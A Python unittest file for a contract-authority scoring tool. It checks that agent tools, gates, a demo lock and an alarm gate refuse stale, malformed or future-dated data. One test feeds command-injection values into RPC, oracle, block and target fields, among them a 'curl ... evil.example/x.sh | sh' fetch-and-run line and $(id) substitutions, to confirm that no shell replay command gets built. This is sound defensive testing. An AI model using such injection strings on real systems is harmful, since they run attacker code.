"""Tests added by the second round of review for the readers that take decisions from the Watch files: the local tools of the agents, the 14-line gate, the demo lock,
the public audit and the alarm gate. No network. Each test is a case an independent reviewer ran by hand.
"""
import contextlib, io, json, os, subprocess, sys, tempfile, time, unittest

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPTS = os.path.abspath(os.path.join(HERE, ".."))
ROOT = os.path.abspath(os.path.join(SCRIPTS, ".."))
sys.path.insert(0, SCRIPTS); sys.path.insert(0, os.path.join(SCRIPTS, "lib")); sys.path.insert(0, os.path.join(ROOT, "integrations"))
import agent_tools, alarm_gate, authority_facts_gate, authority_facts_gate_strict  # noqa: E402
from lib import reader_audit  # noqa: E402

A, B = "0x" + "aa" * 20, "0x" + "bb" * 20
NOW = int(time.time())


def row(addr, comp=95, stale=False):
    t = {"target": addr, "adminKeyScore": 90, "multisigScore": 90, "timelockScore": 90, "oracleAuthorityScore": 90, "crossExposureScore": 90, "compositeScore": comp, "lastUpdated": NOW - 600, "methodologyHash": "0x" + "ab" * 32}
    if stale is not None:
        t["stale"] = stale
    return t


def watch(tmp, read_at=None, rpc="https://sepolia.base.org", oracle="0x" + "11" * 20, block=40000000, rows=None, name="Base (Sepolia)"):
    os.makedirs(os.path.join(tmp, "scores"), exist_ok=True)
    doc = {"name": name, "kind": "evm", "oracle": oracle, "rpc": rpc, "block": block, "maxStaleness": 777600, "readAt": NOW - 3600 if read_at is None else read_at, "targets": rows or [row(A)]}
    if read_at == "drop":
        del doc["readAt"]
    json.dump(doc, open(os.path.join(tmp, "scores", "base-sepolia.json"), "w"))
    return tmp


class TestAgentToolsDoNotAnswerOkOnWhatTheyCannotKnow(unittest.TestCase):
    def test_a_score_file_of_100_days_ago_is_not_an_answer(self):
        with tempfile.TemporaryDirectory() as t:
            r = agent_tools.get_score(watch(t, read_at=NOW - 100 * 86400), "base", A)
        self.assertEqual(r["status"], "not_read")
        self.assertIn("hours ago", r["reason"])

    def test_a_missing_or_wrong_stale_flag_is_not_an_answer_and_is_named_in_not_read(self):
        for stale in (None, "false", 0, 1):
            with tempfile.TemporaryDirectory() as t:
                r = agent_tools.get_score(watch(t, rows=[row(A, stale=stale)]), "base", A)
            self.assertEqual(r["status"], "not_read", repr(stale))
            self.assertIn("stale", r["not_read"], repr(stale))

    def test_a_file_without_readat_or_dated_in_the_future_is_not_an_answer(self):
        for ra in ("drop", NOW + 86400):
            with tempfile.TemporaryDirectory() as t:
                r = agent_tools.get_score(watch(t, read_at=ra), "base", A)
            self.assertEqual(r["status"], "not_read", repr(ra))
        with tempfile.TemporaryDirectory() as t:
            r = agent_tools.get_score(watch(t, read_at="drop"), "base", A)
        self.assertIn("watch_read_utc", r["not_read"])

    def test_a_composite_outside_0_100_or_a_boolean_is_not_an_answer(self):
        for comp in (150, -3, True, "95", None):
            with tempfile.TemporaryDirectory() as t:
                r = agent_tools.get_score(watch(t, rows=[row(A, comp=comp)]), "base", A)
            self.assertEqual(r["status"], "not_read", repr(comp))

    def test_a_fresh_complete_row_is_still_ok(self):
        with tempfile.TemporaryDirectory() as t:
            r = agent_tools.get_score(watch(t), "base", A)
        self.assertEqual((r["status"], r["not_read"], r["reason"]), ("ok", [], None))

    def test_check_protocol_has_no_verdict_on_an_old_score_file(self):
        import glob
        sys.path.insert(0, HERE)
        import test_agent_tools as tat
        with tempfile.TemporaryDirectory() as t:
            tat.build(t)
            self.assertEqual(agent_tools.check_protocol(t, "alpha-swap-v3", 0)["status"], "ok")           # the fixture is fresh
            for f in glob.glob(os.path.join(t, "scores", "*.json")):
                d = json.load(open(f)); d["readAt"] = NOW - 100 * 86400; json.dump(d, open(f, "w"))
            r = agent_tools.check_protocol(t, "alpha-swap-v3", 0)
        self.assertEqual(r["status"], "not_read")
        self.assertIn("hours ago", r["reason"])
        self.assertNotIn("verdict", r)


class TestTheReplayCommandCannotCarryAShellCommand(unittest.TestCase):
    def test_hostile_rpc_oracle_block_or_target_give_no_command(self):
        for kw in ({"rpc": "https://rpc.example/ ; curl -s https://evil.example/x.sh | sh #"}, {"rpc": "http://rpc.example"}, {"rpc": "https://rpc.example/`id`"}, {"rpc": "https://a b"}, {"rpc": "https://rpc.example/$(id)"},
                   {"oracle": "0x" + "11" * 20 + "; id"}, {"oracle": "oracle"}, {"block": "1; id"}, {"block": True}, {"block": -1}, {"block": 0}):
            with tempfile.TemporaryDirectory() as t:
                r = agent_tools.get_score(watch(t, **kw), "base", A)
            self.assertIsNone(r["replay"], kw)

    def test_a_target_that_is_not_an_address_is_not_replayed(self):
        with tempfile.TemporaryDirectory() as t:
            w = watch(t, rows=[row(A + " ; id")])
            r = agent_tools.get_score(w, "base", A + " ; id")
        self.assertIsNone(r["replay"])

    def test_a_plain_file_still_gets_its_command(self):
        with tempfile.TemporaryDirectory() as t:
            r = agent_tools.get_score(watch(t), "base", A)
        self.assertIn("cast call 0x" + "11" * 20, r["replay"]["command"])
        self.assertIn("--rpc-url https://sepolia.base.org --block 40000000", r["replay"]["command"])


class TestTheCommandLineSaysWhatTheAnswerIs(unittest.TestCase):
    def run_cli(self, *args):
        r = subprocess.run([sys.executable, "-B", "-E", os.path.join(SCRIPTS, "agent_tools.py"), *args], capture_output=True, text=True, timeout=60)
        return r.returncode, r.stdout

    def test_exit_codes(self):
        with tempfile.TemporaryDirectory() as t:
            self.assertEqual(self.run_cli("get_score", "--watch", t, "--chain", "base", "--address", A)[0], 3)               # no state at all: not read
            w = watch(t)
            self.assertEqual(self.run_cli("get_score", "--watch", w, "--chain", "base", "--address", A)[0], 0)
            self.assertEqual(self.run_cli("get_score", "--watch", w, "--chain", "base", "--address", B)[0], 1)               # not tracked
        with tempfile.TemporaryDirectory() as t:
            w = watch(t, read_at=NOW - 100 * 86400)
            self.assertEqual(self.run_cli("get_score", "--watch", w, "--chain", "base", "--address", A)[0], 3)


class TestTheFourteenLineGateRefusesWhatItDoesNotKnow(unittest.TestCase):
    LABEL = {"chain": "base", "composite": 90, "band": "STRONG", "react_hours": 100, "keys_to_move": 3, "stale": False}

    def test_the_good_label_passes_and_every_unknown_is_refused_by_both_gates(self):
        self.assertTrue(authority_facts_gate.gate(self.LABEL)[0])
        for field, bad in (("stale", None), ("stale", 0), ("stale", ""), ("stale", "false"), ("stale", True), ("composite", 150), ("composite", -1), ("composite", True), ("composite", "90"), ("composite", None),
                           ("composite", 89.5), ("react_hours", None), ("react_hours", float("nan")), ("react_hours", float("inf")), ("react_hours", "100"), ("react_hours", True), ("react_hours", 3)):
            lab = dict(self.LABEL, **{field: bad})
            self.assertFalse(authority_facts_gate.gate(lab)[0], (field, bad))
            self.assertFalse(authority_facts_gate_strict.strict_gate(lab, strict=True)[0], (field, bad))

    def test_a_boolean_is_not_a_number_even_when_the_lines_are_set_to_zero(self):
        for field in ("composite", "react_hours"):
            lab = dict(self.LABEL, **{field: True})
            self.assertFalse(authority_facts_gate.gate(lab, min_composite=0, min_react_hours=0)[0], field)

    def test_a_missing_key_or_a_non_object_is_refused_not_a_traceback(self):
        for gone in ("stale", "composite", "react_hours"):
            lab = dict(self.LABEL); del lab[gone]
            self.assertFalse(authority_facts_gate.gate(lab)[0], gone)
        for junk in (None, [], "x", 3):
            self.assertFalse(authority_facts_gate.gate(junk)[0], junk)
        lab = dict(self.LABEL); del lab["chain"]; del lab["band"]
        self.assertTrue(authority_facts_gate.gate(lab)[0])       # the words of the message are not decision data

    def test_the_age_limit_of_the_strict_gate_reads_last_pushed(self):
        g = authority_facts_gate_strict.strict_gate
        lab = dict(self.LABEL, last_pushed=NOW - 3600)
        self.assertTrue(g(lab, max_age_hours=2)[0])
        self.assertFalse(g(lab, max_age_hours=0.5)[0])
        self.assertFalse(g(self.LABEL, max_age_hours=2)[0])                                                   # no last_pushed and an age limit asked
        self.assertFalse(g(dict(self.LABEL, last_pushed="not a date"), max_age_hours=2)[0])
        for bad in (True, 0, -5, None):
            ok, why = g(dict(self.LABEL, last_pushed=bad), max_age_hours=2)
            self.assertEqual((ok, why), (False, "last_pushed not read, and you asked for an age limit"), bad)
        iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(NOW - 3600))
        self.assertTrue(g(dict(self.LABEL, last_pushed=iso), max_age_hours=2)[0])
        self.assertTrue(g(self.LABEL)[0])                                                                     # no limit asked: as before


class TestTheDemoLockIsNotGreenWhenEmpty(unittest.TestCase):
    def run_lock(self, lock, reading):
        with tempfile.TemporaryDirectory() as t:
            a, b = os.path.join(t, "lock.json"), os.path.join(t, "reading.json")
            json.dump(lock, open(a, "w")); json.dump(reading, open(b, "w"))
            r = subprocess.run([sys.executable, "-B", "-E", os.path.join(ROOT, "docs", "demo", "authority_lock_check.py"), a, b], capture_output=True, text=True, timeout=60)
        return r.returncode, r.stdout

    def test_an_empty_lock_is_an_error_and_a_reading_that_was_not_read_is_red_even_without_an_expected_state(self):
        code, out = self.run_lock({"format": "authority.lock/0.1-x", "entries": []}, {"readings": []})
        self.assertEqual(code, 2); self.assertNotIn("GREEN", out)
        entry = {"label": "x", "chain": "base", "address": A, "expect": {"admin": "a"}}
        code, out = self.run_lock({"format": "authority.lock/0.1-x", "entries": [entry]}, {"readings": [{"chain": "base", "address": A, "state": "not_read"}]})
        self.assertEqual(code, 1); self.assertIn("NOT READ", out)


class TestTheAlarmGateDoesNotTrustAFutureNotice(unittest.TestCase):
    FOUND = {"high:r|c|t"}

    def state(self, notified):
        return {"findings": sorted(self.FOUND), "notified_utc": notified}

    def test_a_notice_in_the_future_or_unreadable_is_no_notice(self):
        now = time.time()
        for last in ("2099-01-01T00:00:00Z", "garbage", 5):
            self.assertEqual(alarm_gate.decide(self.FOUND, self.state(last), now), "new", repr(last))
            self.assertEqual(reader_audit.decide_gate(self.FOUND, self.state(last), now), "new", repr(last))

    def test_a_recent_notice_still_keeps_it_quiet_and_an_old_one_reminds(self):
        now = time.time()
        recent = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(now - 3600)); old = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(now - 30 * 3600))
        self.assertEqual(alarm_gate.decide(self.FOUND, self.state(recent), now), "quiet")
        self.assertEqual(reader_audit.decide_gate(self.FOUND, self.state(recent), now), "quiet")
        self.assertNotEqual(alarm_gate.decide(self.FOUND, self.state(old), now), "quiet")
        self.assertNotEqual(reader_audit.decide_gate(self.FOUND, self.state(old), now), "quiet")


if __name__ == "__main__":
    unittest.main()
